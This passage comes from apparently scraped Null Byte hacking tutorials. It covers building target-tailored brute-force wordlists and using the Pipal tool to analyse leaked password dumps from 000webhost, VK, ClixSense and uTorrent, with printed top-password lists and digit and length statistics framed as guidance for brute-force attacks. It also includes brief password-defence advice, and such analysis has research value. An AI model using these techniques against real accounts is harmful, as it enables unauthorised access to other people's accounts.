outputs.\nWe've produced a wordlist with a lot of outputs! This file would be 8.3 GB of password guesses to save. While this may be fine for some scenarios, we can also compress this with the option to save these options instead as a set of rules to dynamically generate the same list with tools like Hashcat or John the Ripper. To save your wordlist as either a wordlist file or as a set of rules, click the \"Process\" icon in the top-right corner, and select if you'd like to output the wordlist or rules.\nDon't Miss: The Strategy You Need to Know When Cracking Passwords\nOnce you save your final list, you've created a large, customized set of password guesses tailored to the individual user. This wordlist should be much more effective at brute-forcing a target you know more information about, and can benefit even more if you have examples of the password policy for the account you're trying to hack or a previously breached password.\nDefending Against Tailored Brute-Force Attacks\nThese attacks target users who attempt to create stronger passwords using details around them that can be easily memorized. By using details like names of pets or family, significant dates, or another password \"seeds\" that can be researched, a word mangler can create many different variations using the same seed, increasing the likelihood of brute-forcing the password.\nTo defend against this, users should never pick a password derived from easily researched details, especially if adding a number or modifying the case is the only thing modifying it. Instead, pick an acronym for a long phrase you can remember, or use a password manager to generate a completely random and secure password. By using a password manager, you can sidestep needing to always remember your password in the first place.\nCreating a custom password list of several million potential guesses based on details about the target is easy and requires only a small amount of research. I hope this guide has given you a window into the science of password cracking, and encourage you to explore how much further you can go with increasing the performance of brute-force attacks.\nIf you have any questions or comments, feel free to leave a comment or reach me on Twitter @KodyKinzie.",
        "category": "Password Cracking"
    },
    {
        "title": "Use Leaked Password Databases to Create Brute-Force Wordlists",
        "link": "https://null-byte.wonderhowto.com/how-to/use-leaked-password-databases-create-brute-force-wordlists-0184006/",
        "content": "* WonderHowTo\nTo name just a few companies, VK, µTorrent, and ClixSense all suffered significant data breaches at some point in the past. The leaked password databases from those and other online sites can be used to understand better how human-passwords are created and increase a hacker's success when performing brute-force attacks.\nIn other articles, we'll cover generating wordlists for use in password-cracking. But here, we'll learn how to create wordlists of statistical complexity and length based on actual passwords found in database leaks that occurred in recent years. Understanding how average, every-day people think about passwords will aid hackers during password-guessing attacks and greatly increase the statical probability of the success of the brute-force attacks.\n* Don't Miss: The Terms & Technologies You Need to Before Hacking Databases\nThe leaked databases featured in this article were obtained using public and darknet resources. The databases are all at least four years old. This was intentional and would ensure that this article would harm no victim of these leaks as they've had an opportunity to reset their passwords. Also, passwords used in 2016 would still provide excellent datasets for understanding how people create passwords today.\nWhat Makes a Good Password List?\nRealistically, it's not possible to brute-force an SSH service or web login with a list of five million passwords. An attack like that would set off all kinds of alarms and take an incomprehensible amount of time to complete.\nSome may believe that massive, comprehensive, 100 GB wordlists are common and often utilized by hackers. However, we'll learn that small targeted and fine-tuned wordlists will usually get the job done while avoiding detection. The quality (or commonness) of the passwords takes priority over the length of the wordlist.\nWhat Is Pipal?\nPipal, created by Digininja, a well-known hacker in cybersecurity circles, is a password analyzer which curates password list statistics. Pipal is capable of identifying the most common digits appended to passwords, the most common length of passwords, the most common passwords found in the databases, and much more.\nThis data is valuable to hackers looking to improve the strength of their wordlists and increase the likeliness of success when performing brute-force attacks. Below is an example of Pipal's output (the top 35 passwords) after analyzing the µTorrent hack, which consisted of nearly 400,000 passwords.\n* Don't Miss: How to Extract Data from Online Databases Using Sqlmap\n123456       = 386 (0.11%)\nforum123     = 152 (0.04%)\npassword     = 116 (0.03%)\nutorrent     = 94  (0.03%)\nqwerty       = 71  (0.02%)\n12345678     = 57  (0.02%)\n123456789    = 57  (0.02%)\n111111       = 46  (0.01%)\n123123       = 37  (0.01%)\nMykey2012    = 35  (0.01%)\nabc123       = 30  (0.01%)\n000000       = 27  (0.01%)\ntrustno1     = 26  (0.01%)\nletmein      = 26  (0.01%)\ntorrent      = 24  (0.01%)\nqazwsx       = 24  (0.01%)\nMykey2011    = 23  (0.01%)\n1234         = 21  (0.01%)\n666666       = 20  (0.01%)\nshadow       = 19  (0.01%)\n12345        = 19  (0.01%)\n1234567      = 19  (0.01%)\n1q2w3e4r     = 19  (0.01%)\ndragon       = 18  (0.0%)\nfuckyou      = 18  (0.0%)\nPaperindex1* = 18  (0.0%)\nabcd1234     = 16  (0.0%)\nmatrix       = 15  (0.0%)\n123321       = 15  (0.0%)\n1234567890   = 15  (0.0%)\nmaster       = 14  (0.0%)\nmonkey       = 14  (0.0%)\n123qwe       = 14  (0.0%)\njackass      = 13  (0.0%)\nkiller       = 13  (0.0%)\nContinue below the Cyber Weapons Lab video to see how to install and use Pipal, enable modules, and analyze password lists. You could also watch the Null Byte video and follow along with my guide simultaneously, if that helps.\nStep 1: Install or Update Ruby & Git\nRuby version 2.5 or later is required to use Pipal. If you think you have Ruby already, you can see which version you have with ruby -v.\nruby 2.4.8 (2019-10-01 revision 026ee6f091) [x86_64-linux-gnu]\nIf you don't have it or it's outdated, you'll need to install or update it. You'll also need Git, which is required to clone the GitHub repository. The below command can be used to install or update both.\n~$ sudo apt install ruby2.7 git\n[sudo] password for null byte:\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\nSuggested packages:\ngit-daemon-run | git-daemon-sysvinit git-doc git-el git-email git-gui gitk\ngitweb git-cvs git-mediawiki git-svn\nThe following packages will be upgraded:\ngit git-man ruby2.7\n3 upgraded, 0 newly installed, 0 to remove and 853 not upgraded.\nNeed to get 9,151 kB of archives.\nAfter this operation, 2,443 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 http://kali.download/kali kali-rolling/main amd64 git amd64 1:2.27.0-1 [6,707 kB]\nGet:2 http://kali.download/kali kali-rolling/main amd64 git-man all 1:2.27.0-1 [1,774 kB]\nGet:3 http://kali.download/kali kali-rolling/main amd64 ruby2.7 amd64 2.7.1-3 [670 kB]\nFetched 9,151 kB in 2s (5,301 kB/s)\nReading changelogs... Done\n(Reading database ... 377124 files and directories currently installed.)\nPreparing to unpack .../git_1%3a2.27.0-1_amd64.deb ...\nUnpacking git (1:2.27.0-1) over (1:2.26.2-1) ...\nPreparing to unpack .../git-man_1%3a2.27.0-1_all.deb ...\nUnpacking git-man (1:2.27.0-1) over (1:2.26.2-1) ...\nPreparing to unpack .../ruby2.7_2.7.1-3_amd64.deb ...\nUnpacking ruby2.7 (2.7.1-3) over (2.7.0-4) ...\nSetting up ruby2.7 (2.7.1-3) ...\nSetting up git-man (1:2.27.0-1) ...\nSetting up git (1:2.27.0-1) ...\nProcessing triggers for man-db (2.9.1-1) ...\nProcessing triggers for kali-menu (2020.2.2) ...\nStep 2: Install Pipal\nPipal can be found in Kali, but it's a slightly older version which doesn't support all of the available features and should be removed to avoid any confusion.\n~$ sudo apt autoremove pipal\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages will be REMOVED:\nkali-linux-default pipal\n0 upgraded, 0 newly installed, 2 to remove and 856 not upgraded.\nAfter this operation, 198 kB disk space will be freed.\nDo you want to continue? [Y/n] y\n(Reading database ... 377177 files and directories currently installed.)\nRemoving kali-linux-default (2020.1.13) ...\nRemoving pipal (3.1-0kali0) ...\nProcessing triggers for kali-menu (2020.2.2) ...\nNext, clone the Pipal GitHub repository.\n~$ git clone https://github.com/digininja/pipal.git\nCloning into 'pipal'...\nremote: Enumerating objects: 4, done.\nremote: Counting objects: 100% (4/4), done.\nremote: Compressing objects: 100% (4/4), done.\nremote: Total 582 (delta 0), reused 1 (delta 0), pack-reused 578\nReceiving objects: 100% (582/582), 158.46 KiB | 1.82 MiB/s, done.\nResolving deltas: 100% (349/349), done.\nUse the cd command to change into the newly created Pipal directory.\n~$ cd pipal\nWhen using Pipal, be sure to use Ruby 2.5 or later, which you should have installed or updated in Step 1. To view the available Pipal options, use the --help argument.\n~/pipal$ ruby2.7 pipal.rb --help\npipal 3.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)\nUsage: pipal [OPTION] ... FILENAME\n--help, -h, -?: show help\n--top, -t X: show the top X results (default 10)\n--output, -o <filename>: output to file\n--gkey <Google Maps API key>: to allow zip code lookups (optional)\n--list-checkers: Show the available checkers and which are enabled\n--verbose, -v: Verbose\nFILENAME: The file to count\nStep 3: Enable Pipal Checker Modules (Optional)\nCheckers are the modules that perform the actual analysis. The available modules can be found in the pipal/checkers_available directory.\n~/pipal$ ls checkers_available\nAU_place_checker.rb         FR_colour_checker.rb\nbasic.rb                    FR_date_checker.rb\nBR_area_codes_checker.rb    FR_emotion_checker.rb\nBR_soccer_teams_checker.rb  frequency.rb\ndate_checker.rb             FR_family_checker.rb\nDE_colour_checker.rb        FR_hashcat_mask_generator.rb\nDE_emotion_checker.rb       FR_season_checker.rb\nDE_family_checker.rb        FR_windows_complexity_checker.rb\nDE_religion_checker.rb      hashcat_mask_generator.rb\nDE_road_checker.rb          NL_colour_checker.rb\nDE_season_checker.rb        NL_date_checker.rb\nDE_sport_checker.rb         NL_season_checker.rb\nDE_vehicle_checker.rb       PTBR_colour_checker.rb\nemail_names.rb              PTBR_date_checker.rb\nEN_colour_checker.rb        PTBR_emotion_checker.rb\nEN_emotion_checker.rb       PTBR_explicit_checker.rb\nEN_explicit_checker.rb      PTBR_family_checker.rb\nEN_family_checker.rb        PTBR_religion_checker.rb\nEN_military_checker.rb      PTBR_season_checker.rb\nEN_religion_checker.rb      RU_russia_cities_checker.rb\nEN_road_checker.rb          special_checker.rb\nEN_season_checker.rb        US_area_codes_checker.rb\nEN_sport_checker.rb         usernames.rb\nEN_vehicle_checker.rb       US_state_checker.rb\nEN_violence_checker.rb      US_zip_codes_checker.rb\nexternal_list_checker.rb    windows_complexity_checker.rb\nFR_area_codes.rb\nAlternatively, the modules can be viewed using the --list-checkers command. If you get any errors after running this command, it's likely that something is missing or not fully updated in your Ruby version, but it should show you the gem command to install it.\n~/pipal$ ruby2.7 pipal.rb --list-checkers\nError: levenshtein gem not installed\nuse: \"gem install levenshtein-ffi\" to install the required gem\n~/pipal$ sudo gem install levenshtein-ffi\n[sudo] password for nullbyte:\nFetching levenshtein-ffi-1.1.0.gem\nBuilding native extensions. This could take a while...\nSuccessfully installed levenshtein-ffi-1.1.0\nParsing documentation for levenshtein-ffi-1.1.0\nInstalling ri documentation for levenshtein-ffi-1.1.0\nDone installing documentation for levenshtein-ffi after 0 seconds\n1 gem installed\n~/pipal$ ruby2.7 pipal.rb --list-checkers\n/home/nullbyte/pipal/checkers_available/FR_colour_checker.rb:11: warning: key \"ocre\" is duplicated and overwritten on line 11\npipal 3.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)\nYou have the following Checkers on your system\n==============================================\nAustralia_Checker - List of Australian places\nBR_Area_Code_Checker - List of Brazil area codes\nBR_Soccer_Teams_Checker - List of Brazilian Soccer Teams\nBasic_Checker - Basic Checks - Enabled\nColour_Checker - List of common English colours\nDE_Colour_Checker - List of common German colours\nDE_Emotion_Checker - List of German emotional terms\nDE_Family_Checker - List of German family terms\nDE_Religion_Checker - List of German religious terms\nDE_Road_Checker - List of German road terms\nDE_Season_Checker - List of common German seasons\nDE_Sport_Checker - List of German sport terms\nDE_Vehicle_Checker - List of common vehicle manufacturers and models\nDate_Checker - Days, months and years\nEmail_Checker - Compare email addresses to passwords. Checks both name and full address.\nEmotion_Checker - List of English emotional terms\nExplicit_Checker - List of English explicit terms\nExternal_List_Checker - Check an external file for matches\nFR_Colour_Checker - List of common French colours\nFR_Date_Checker - French day, month and year checker\nFR_Emotion_Checker - List of French emotional terms\nFR_Family_Checker - List of French family terms\nFR_Hashcat_Mask_Generator - Hashcat mask generator (French)\nFR_Season_Checker - List of common French seasons\nFR_Windows_Complexity_Checker - Check for default Windows complexity (French)\nFR_area_Code_Checker - List of French area codes\nFamily_Checker - List of English family terms\nFrequency_Checker - Count the frequency of characters in each position, output as either CSV or text\nHashcat_Mask_Generator - Hashcat mask generator\nMilitary_Checker - List of English military terms\nNL_Colour_Checker - List of common dutch colours\nNL_Date_Checker - Dutch day, month and year checker\nNL_Season_Checker - List of common Dutch seasons\nPTBR_Date_Checker - Brazilian Portuguese day, month and year checker\nPTBR_Emotion_Checker - List of Brazilian Portuguese emotional terms\nPTBR_Explicit_Checker - List of Brazilian Portuguese explicit terms\nPTBR_Family_Checker - List of Brazilian Portuguese family terms\nPTBR_Religion_Checker - List of Brazilian Portuguese religious terms\nPTBR_Season_Checker - List of common Brazilian Portuguese seasons\nReligion_Checker - List of religious terms\nRoad_Checker - List of English road terms\nRussian_Cities_Checker - List of common Russian cities\nSeason_Checker - List of common English seasons\nSpecial_Checker - No description given\nSport_Checker - List of English sport terms\nUS_Area_Code_Checker - List of US area codes\nUS_State_Checker - List of United States states\nUS_Zip_Code_Checker - List of US zip codes\nUsername_Checker - Compare usernames to passwords.\nVehicle_Checker - List of common vehicle manufacturers and models\nViolence_Checker - List of English violent terms\nWindows_Complexity_Checker - Check for default Windows complexity\nBy default, Pipal will analyze password lists and display tons of useful information using the basic.rb (Basic_Checker) module. However, to enhance Pipal's analysis capabilities, copy the desired modules from pipal/checkers_available directory to the pipal/checkers_enabled directory.\n* Don't Miss: How to Install RVM to Maintain Ruby Environments in macOS\nI recommend enabling the modules that start with \"EN_,\" which will enumerate the most popular religious terms, explicit terms, colors, vehicles, and more. Keep in mind, using many modules will increase the duration of the analysis. In some cases, where large (1 GB) wordlists were analyzed, Pipal would crash and fail to complete the analysis.\nTo symbolically link a single module to the pipal/checkers_enabled directory, use the below command, replacing the .rb file with the one you want to use.\n/pipal$ ln -s checkers_available/EN_emotion_checker.rb checkers_enabled\nTo symlink all of the \"EN_\" modules, use the below command. The wildcard (*) tells the ln command to symbolically link any file starting with \"EN_\" to the pipal/checkers_enabled directory.\n/pipal$ ln -s checkers_available/EN_* checkers_enabled\nStep 4: Analyze Password Lists\nLooking back at the available options again, there are two primary arguments which are always used.\n~/pipal$ ruby2.7 pipal.rb --help\npipal 3.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)\nUsage: pipal [OPTION] ... FILENAME\n--help, -h, -?: show help\n--top, -t X: show the top X results (default 10)\n--output, -o <filename>: output to file\n--gkey <Google Maps API key>: to allow zip code lookups (optional)\n--list-checkers: Show the available checkers and which are enabled\n--verbose, -v: Verbose\nFILENAME: The file to count\nBy default, Pipal will only display the top 10 most common statistics. This default value is a bit low, so the --top argument should be used to increase that value. In all my below password analyses, the top 500 passwords were displayed. The --output argument is used to specify the file path and directory where the analyzed data is saved.\nUsing Pipal is very simple. Type the below command into a terminal to start analyzing password lists. Both files are text files, but you could use \"txt\" if you wanted, and both of their names can be customized too. I'm using \"results.pipal\" and \"password.list\" variations in my \"dumps\" folder in my home directory.\n~/pipal$ ruby2.7 pipal.rb --top 500 --output ../dumps/results.pipal ../dumps/password.list\nGenerating stats, hit CTRL-C to finish early and dump stats on words already processed.\nPlease wait...\nProcessing:    100$ |oooooooooooooooooooooooooooo | ETA 00:00:00\nWordlists that contain millions of passwords can take several minutes (up to an hour) for Pipal to analyze thoroughly. Complete details of all the Pipal analyses featured in this article can be found on my GitHub.\nExample 1: 000webhost.com Password Analysis\n000webhost is a free web hosting service that caters to millions of users worldwide. The 000webhost.com hack occurred in 2015, making this database about five years old. However, it offered a large dataset of over 13 million passwords, so it seemed appropriate to include it in this article.\n~/pipal$ ruby2.7 pipal.rb --top 500 --output ../dumps/analysis/000webhost.com.pipal ../dumps/000webhost.com_2015_password.list\nGenerating stats, hit CTRL-C to finish early and dump stats on words already processed.\nPlease wait...\nProcessing:    100% |oooooooooooooooooooooooooooo | ETA 00:00:00\nAfter analyzing the 000webhost password list, here's what I found:\nPassword Length\nMost passwords were only eight-characters long, accounting for 34% of all the unique passwords found in the password wordlist. Roughly 20% of passwords were only seven or six characters long — which is astonishingly low.\n8  = 67313 (34.58%)\n6  = 33392 (17.15%)\n9  = 29588 (15.2%)\n7  = 24916 (12.8%)\n10 = 23994 (12.33%)\n* Don't Miss: Principles & Technologies for Cracking Passwords\nThis information is valuable to hackers as it indicates that most wordlists designed for remote brute-force attacks only need to be six to eight characters long to cover roughly 50% of all password lengths. A patient hacker would include nine- and ten-character passwords to get closer to 90% effectiveness, but that may not be required in most cases.\nAppended Digits\nIt's not uncommon for people to add a number or two to the end of their passwords, e.g., password123. Over 25% of all passwords were found to have one or two digits appended to the password. Two-digit numbers were the most common with 16 percent.\nSingle digit on the end = 22,230 (11.42%)\nTwo digits on the end   = 31,214 (16.03%)\nThree digits on the end = 18,447 (9.48%)\nThe most common single digit appended to a password was the number \"1,\" being used 24,214 times and accounting for over 12% of all passwords. It was followed closely by the number \"3,\" appended 16,362 times or nearly one out of every 11 passwords.\n1 = 24,214 (12.44%)\n3 = 16,362 (8.41%)\n2 = 11,650 (5.98%)\n0 = 9,687  (4.98%)\n4 = 8,671  (4.45%)\nThe most common two digits appended to a password was the number \"23;\" appended 9,054 times, only four percent.\n23 = 9,054 (4.65%)\n12 = 3,822 (1.96%)\n01 = 3,629 (1.86%)\n11 = 3,089 (1.59%)\n00 = 2,791 (1.43%)\nThe most common three digits appended to a password was the number \"123;\" again, just over four percent.\n123 = 7,938 (4.08%)\n456 = 2,143 (1.1%)\n234 = 1,644 (0.84%)\n000 = 935   (0.48%)\n007 = 635   (0.33%)\nThe numbers 1, 3, 2, 23, 12, 123, and 456 were appended to over 33% (75,000+) of all passwords. It almost doesn't make sense to include other appendages in brute-force wordlists. Statistically speaking, other numbers appear too infrequently to warrant inclusion.\nSpecial Characters\nWith the \"@\" special character only being included in 0.8% of all passwords, it's safe to omit passwords containing special characters (or \"1337 Speak\") from brute-force wordlists. A patient hacker who wishes to create a comprehensive wordlist may consider including some of the top three special characters. Adversely, someone hoping to protect their account from brute-force attacks may want to include a special character in their (probably weak) password.\n@ = 1,614 (0.83%)\n. = 881   (0.45%)\n# = 780   (0.4%)\n* Don't Miss: How to Use CUPP to Generate Password Lists\nTop 25 Passwords\nAnyone familiar with password lists won't be surprised to see \"123456\" is the most common password having been used to secure 783 different accounts. \"Abcdef123\" and \"a123456\" follow closely behind with both used over 500 times each.\n123456        = 783 (0.4%)\nAbcdef123     = 608 (0.31%)\na123456       = 580 (0.3%)\nlittle123     = 468 (0.24%)\nnanda334      = 391 (0.2%)\nN97nokia      = 367 (0.19%)\npassword      = 315 (0.16%)\nPawerjon123   = 275 (0.14%)\n421uiopy258   = 230 (0.12%)\nMYworklist123 = 182 (0.09%)\n12345678      = 175 (0.09%)\nqwerty        = 169 (0.09%)\nnks230kjs82   = 152 (0.08%)\ntrustno1      = 150 (0.08%)\nzxcvbnm       = 138 (0.07%)\nN97nokiamini  = 132 (0.07%)\nletmein       = 131 (0.07%)\n123456789     = 131 (0.07%)\nmyplex        = 110 (0.06%)\ngm718422@     = 109 (0.06%)\nchuru123A     = 107 (0.05%)\nabc123        = 105 (0.05%)\nplex123       = 95  (0.05%)\nany123456     = 94  (0.05%)\nLwf1681688    = 92  (0.05%)\n* Don't Miss: The Strategy You Need to Know When Cracking Passwords\nIt's not unusual to see strange or bizarre passwords ranked highly in database lists. The password \"nanda123\" and \"N97nokia,\" for example. These passwords were used over 350 times each. It's unclear how this happened, most likely a small group of individuals (probably hackers) created multiple accounts over a long period of time and reused the same password over and over. When generating wordlists, it's really up to the hacker to determine whether or not to include a particular password in the wordlist.\nTop 25 Base Words\nHere's where I think Pipal really shines. It's able to omit the numbers appended to the ends of passwords and analyze the words used at the beginning of the passwords. This data is especially useful to hackers because they're then able to use the base words in conjunction with the most commonly used digits to create comprehensive wordlists. For example, take note of \"welcome\" ranked 24th in the below list.\npassword     = 735 (0.38%)\nabcdef       = 699 (0.36%)\nplex         = 546 (0.28%)\nqwerty       = 505 (0.26%)\nlittle       = 481 (0.25%)\nnanda        = 401 (0.21%)\nn97nokia     = 367 (0.19%)\npawerjon     = 275 (0.14%)\nletmein      = 252 (0.13%)\nuiopy        = 230 (0.12%)\ntrustno      = 200 (0.1%)\nabcd         = 189 (0.1%)\npassw0rd     = 186 (0.1%)\nmonkey       = 184 (0.09%)\nmyworklist   = 182 (0.09%)\nmaster       = 171 (0.09%)\npass         = 166 (0.09%)\nasdf         = 164 (0.08%)\ngondola      = 164 (0.08%)\ndragon       = 156 (0.08%)\nzxcvbnm      = 154 (0.08%)\nnks230kjs    = 152 (0.08%)\nhello        = 148 (0.08%)\nwelcome      = 141 (0.07%)\nn97nokiamini = 133 (0.07%)\nIf the most common single or double digits (\"1\" and \"23\") are appended to \"welcome,\" we find that this password was used several dozen times.\n~/pipal$ grep -i 'welcome1' ../dumps/000webhost.com_2015_password.list\nwelcome1234\nThis is why appending common digits to base words is more beneficial to wordlists than simply compiling a list of the top passwords. How we, as individuals, choose base words and choose digits to append is the one notable inconsistency with how people create passwords. It's better to isolate the two variables then combine the results in a new wordlist.\n* Don't Miss: Crack Passwords with a Crunch-Based Custom Wordlist\nExample 2: VK.com Password Analysis\nVK, a social network heavily inspired by Facebook, is the most popular website in Russia and ranked in the top 20 most popular websites in the world. The social network reportedly has over 300 million registered users.\nThe VK.com hack emerged in 2016, but occurred in 2012. While the passwords found in this data breach are nearly six years old, I couldn't miss the opportunity to analyze a massive dataset of over 92,470,000 passwords.\n~/pipal$ ruby2.7 pipal.rb --top 500 --output ../dumps/analysis/vk.com.pipal ../dumps/vk.com_2012_password.list\nGenerating stats, hit CTRL-C to finish early and dump stats on words already processed.\nPlease wait...\nProcessing:    100% |oooooooooooooooooooooooooooo | ETA 00:00:00\nAfter analyzing the VK.com password list, here's what I found:\nPassword Length\nMore than 50% of all passwords are between six and eight characters long. This is consistent with data found in the 000webhost dataset and reaffirms most wordlists don't need to contain passwords over nine or ten characters long.\n6  = 17,665,381 (19.1%)\n8  = 17,370,491 (18.78%)\n7  = 12,391,947 (13.4%)\n9  = 9,815,371  (10.61%)\n10 = 7,686,762  (8.31%)\nAppended Digits\nFewer passwords appeared with appended digits compared to the 000webhost data, accounting for roughly 12 percent.\nSingle digit on end = 3,023,338 (3.27%)\nTwo digits on end   = 5,326,255 (5.76%)\nThree digits on end = 3,412,773 (3.69%)\nThe most common single and double digits are again \"1,\" \"3,\" and \"23,\" accounting for about 9% (12,600,000) of all passwords.\n1 = 5,919,242 (6.4%)\n3 = 5,221,786 (5.65%)\n0 = 5,079,464 (5.49%)\n6 = 4,854,551 (5.25%)\n23 = 1,474,608 (1.59%)\n11 = 1,398,248 (1.51%)\n89 = 1,337,274 (1.45%)\n56 = 1,266,445 (1.37%)\n123 = 1,135,684 (1.23%)\n456 = 1,003,088 (1.08%)\n789 = 638,695   (0.69%)\n777 = 584,292   (0.63%)\nTop 25 Passwords\nWe can clearly see fewer passwords appeared with appended digits compared to the 000webhost data, and more passwords containing only numbers are popular among users in this dataset.\n123456     = 653,959\n123456789  = 383,177\nqwerty     = 263,565\n111111     = 176,226\n1234567890 = 144,494\n1234567    = 131,279\n12345678   = 99,885\n123321     = 87,148\n000000     = 85,468\n123123     = 84,036\n7777777    = 81,544\nzxcvbnm    = 79,199\n666666     = 72,052\nqwertyuiop = 69,178\n123qwe     = 62,680\n555555     = 61,762\n1q2w3e     = 57,425\ngfhjkm     = 51,310\nqazwsx     = 50,686\n1q2w3e4r   = 49,676\n654321     = 48,435\n987654321  = 46,461\n121212     = 41,896\n777777     = 39,966\nzxcvbn     = 39,527\nUnfortunately, Pipal is restrained by our computer's memory (RAM) and struggled to analyze VK.com's 92,000,000 password dataset. Pipal wasn't able to determine the percentages of each password found or the top base words or passwords with special characters, but we were able to figure out the number of times each password appeared. Special thanks to @digininja for working with me to analyze this dataset.\n* Don't Miss: How to Find Sensitive & 'Deleted' Windows 10 Files Remotely\nExample 3: ClixSense.com Password Analysis\nClixSense is a \"paid-to-click\" website that compensates people (microtransactions) for taking part in surveys and viewing advertisements. (It is also banned on Null Byte, in case you had any ideas in the forum.)\nThe ClixSense hacked data was posted online, in 2016, by the attackers who claimed it was a subset of a larger 6.6 million dataset. There are 2.2 million passwords in my ClixSense password list. While it's not the complete ClixSense list, it still provides an adequately large dataset belonging to a very recent hack.\n~/pipal$ ruby2.7 pipal.rb --top 500 --output ../dumps/analysis/clixsense.com.pipal ../dumps/clixsense.com_2016_password.list\nGenerating stats, hit CTRL-C to finish early and dump stats on words already processed.\nPlease wait...\nProcessing:    100% |oooooooooooooooooooooooooooo | ETA 00:00:00\nAfter analyzing the ClixSense.com password list, here's what I found:\nPassword Length\nPasswords consisting of nine or fewer characters are (again) the most common length of password found in large leaks. This further confirms the fact that short, eight- and six-character passwords, should be used when designing wordlists for brute-force attacks.\n8  = 526,916 (23.72%)\n6  = 407,346 (18.33%)\n9  = 314,908 (14.17%)\n10 = 286,220 (12.88%)\n7  = 285,726 (12.86%)\nAppended Digits\nThe one-digit, two-digit, and three-digit combinations most commonly appended to passwords are very consistent with the 000webhost.com dataset.\nSingle digit on the end = 121,811 (5.48%)\nTwo digits on the end   = 239,247 (10.77%)\nThree digits on the end = 151,586 (6.82%)\n1 = 177,622 (7.99%)\n3 = 159,989 (7.2%)\n0 = 119,043 (5.36%)\n2 = 118,338 (5.33%)\n23 = 71,414 (3.21%)\n56 = 31,159 (1.4%)\n12 = 30,915 (1.39%)\n11 = 30,248 (1.36%)\n123 = 58,898 (2.65%)\n456 = 25,874 (1.16%)\n234 = 11,166 (0.5%)\n007 = 10,573 (0.48%)\nSpecial Characters\nOnce again, the \"@\" and \".\" special characters were found in over 1% of passwords. This is too small of a percent to warrant including special characters in wordlists, but again, using special characters in passwords will significantly hinder an attacker's ability to brute-force a service.\n@ = 31,778 (1.43%)\n. = 16,108 (0.73%)\n_ = 14,711 (0.66%)\n! = 11,248 (0.51%)\nTop 25 Passwords\nThe password \"123456\" once again takes the lead being used 17,879 times. And again we see a unique password, \"bismillah,\" used over 1,000 times (see the \"base words\" list after this list). It's not uncommon to see cultural or religious terms in datasets where the hacked website is popular in a particular country.\n123456     = 17,879 (0.8%)\n123456789  = 3,292  (0.15%)\n12345678   = 2,093  (0.09%)\npassword   = 1,970  (0.09%)\n111111     = 1,892  (0.09%)\n1234567    = 1,300  (0.06%)\niloveyou   = 1,266  (0.06%)\nqwerty     = 1,187  (0.05%)\nclixsense  = 1,173  (0.05%)\n000000     = 977    (0.04%)\nabcdefg    = 972    (0.04%)\n123123     = 923    (0.04%)\npakistan   = 803    (0.04%)\n654321     = 745    (0.03%)\nusers      = 736    (0.03%)\nbismillah  = 644    (0.03%)\nabc123     = 615    (0.03%)\n1234567890 = 537    (0.02%)\n666666     = 525    (0.02%)\nasdfgh     = 524    (0.02%)\ncomputer   = 516    (0.02%)\naaaaaa     = 502    (0.02%)\nsecret     = 392    (0.02%)\niloveu     = 391    (0.02%)\nkrishna    = 391    (0.02%)\n* Don't Miss: Crack Passwords with a CeWL-Based Custom Wordlist\nTop 25 Base Words\nA closer look at the top 25 base words reveals some great results. With the exception of website-specific passwords (\"clixsense\" and \"clix\"), hackers would incorporate most of these words into their wordlists and experience some success with brute-force attacks.\npassword  = 3,937 (0.18%)\nclixsense = 2,989 (0.13%)\nqwerty    = 2,798 (0.13%)\niloveyou  = 2,101 (0.09%)\npakistan  = 1,965 (0.09%)\nclix      = 1,285 (0.06%)\nmoney     = 1,271 (0.06%)\nlove      = 1,244 (0.06%)\njune      = 1,208 (0.05%)\nabcdefg   = 1,117 (0.05%)\nbismillah = 1,026 (0.05%)\napril     = 1,006 (0.05%)\nwelcome   = 990   (0.04%)\njuly      = 984   (0.04%)\njesus     = 950   (0.04%)\nabcd      = 936   (0.04%)\nmaster    = 916   (0.04%)\nangel     = 899   (0.04%)\nnokia     = 896   (0.04%)\ncomputer  = 882   (0.04%)\nkrishna   = 822   (0.04%)\nmarch     = 810   (0.04%)\naugust    = 803   (0.04%)\ndaniel    = 777   (0.03%)\nsecret    = 766   (0.03%)\nExample 4: µTorrent.com Password Analysis\nµTorrent is a popular peer-to-peer file sharing client, managed by BitTorrent.com. The µTorrent forum hack occurred in 2016 and consisted of almost 400,000 leaked passwords. This dataset is the smallest featured in this article, but still provides insight into how passwords are created today.\n~/pipal$ ruby2.7 pipal.rb --top 500 --output ../dumps/analysis/utorrent.com.pipal ../dumps/utorrent.com_2016_password.list\nGenerating stats, hit CTRL-C to finish early and dump stats on words already processed.\nPlease wait...\nProcessing:    100% |oooooooooooooooooooooooooooo | ETA 00:00:00\nPassword Length\nA jarring 88% of passwords are eight characters long. This is an increase from other datasets in this article. Still, only 3% of passwords are nine or ten characters long and well within brute-forcing range.\n8  = 323,102 (88.66%)\n6  = 11,314  (3.1%)\n9  = 8,108   (2.22%)\n7  = 7,962   (2.18%)\n10 = 6,058   (1.66%)\nAppended Digits\nA single digit was most commonly appended to a password. We just learned most passwords are a total of eight characters long, so this indicates that most base words are only seven letters long and likely included a \"1\" or \"3\" at the end of the password.\nSingle digit on the end = 45,852 (12.58%)\nTwo digits on the end   = 13,569 (3.72%)\nThree digits on the end = 4,923  (1.35%)\n1 = 10,475 (2.87%)\n3 = 8,904  (2.44%)\n2 = 8,123  (2.23%)\n0 = 7,925  (2.17%)\n23 = 1,737 (0.48%)\n11 = 978   (0.27%)\n12 = 894   (0.25%)\n00 = 837   (0.23%)\n123 = 1,365 (0.37%)\n456 = 521   (0.14%)\n234 = 307   (0.08%)\n000 = 252   (0.07%)\nSpecial Characters\nThe top three most popular special characters were used in just over 0.5% of all passwords. Again, too small of a percent to warrant including special characters in wordlists, but really good to use when you want to hinder an attacker's ability to brute-force a service.\n/ = 833 (0.23%)\n+ = 805 (0.22%)\n@ = 627 (0.17%)\nTop 25 Passwords\nOnce again, we see \"utorrent,\" a website-specific password appearing in the top four passwords.\n123456    = 386 (0.11%)\nforum123  = 152 (0.04%)\npassword  = 116 (0.03%)\nutorrent  = 94  (0.03%)\nqwerty    = 71  (0.02%)\n12345678  = 57  (0.02%)\n123456789 = 57  (0.02%)\n111111    = 46  (0.01%)\n123123    = 37  (0.01%)\nMykey2012 = 35  (0.01%)\nabc123    = 30  (0.01%)\n000000    = 27  (0.01%)\ntrustno1  = 26  